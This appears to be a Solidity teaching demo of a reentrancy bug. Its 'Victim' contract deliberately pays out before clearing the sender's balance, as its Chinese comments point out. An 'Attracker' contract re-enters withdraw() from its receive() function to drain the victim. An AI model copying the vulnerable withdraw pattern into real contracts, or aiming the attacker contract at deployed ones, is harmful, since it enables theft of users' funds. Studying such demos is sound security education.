// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Victim {
   mapping(address => uint) public balances;
    // receive() external payable {}
    function deposit() public payable {
            balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        require(balances[msg.sender] > 0, "No balance");

        // 发送 ETH（外部调用，容易被攻击者重入）
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        // 更新余额（放在调用后，导致漏洞）
        balances[msg.sender] = 0;
    }
    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
    function getBalanceByAddewss(address addr) public view returns (uint) {
        return balances[addr];
    }
}
// 攻击者
contract Attracker {
    Victim public target;

    constructor(address payable _target) {
        target = Victim(_target);
    }
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }
    function deposit() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}